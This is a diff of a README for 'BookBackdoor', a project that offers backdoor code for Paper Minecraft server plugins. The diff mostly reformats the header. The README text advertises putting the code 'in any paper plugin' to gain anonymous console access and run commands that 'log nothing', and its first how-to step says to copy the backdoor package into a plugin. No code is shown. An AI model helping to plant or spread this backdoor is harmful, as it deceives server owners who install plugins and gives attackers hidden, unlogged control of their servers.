@@ -3,9 +3,12 @@
     <img src="https://i.imgur.com/xZ4ujZm.png" alt="Logo" width="800" height="122">    
   </a>
 </p>
-![BookBackdoor](https://github.com/BookBackdoor/BookBackdoor/actions/workflows/maven-publish.yml/badge.svg)
 
-* Put this in any paper plugin to gain anonymous access to CONSOLE or execute custom build in command that log nothing!
+<p allign="center">
+  <img src="https://github.com/BookBackdoor/BookBackdoor/actions/workflows/maven-publish.yml/badge.svg" alt="Build">
+  <br>
+  Put this in any paper plugin to gain anonymous access to CONSOLE or execute custom build in command that log nothing!
+</p>
 
 # How-to
 * 1: Copy the folder ```src/main/java/org/brandonplank/backdoor``` into your plugin
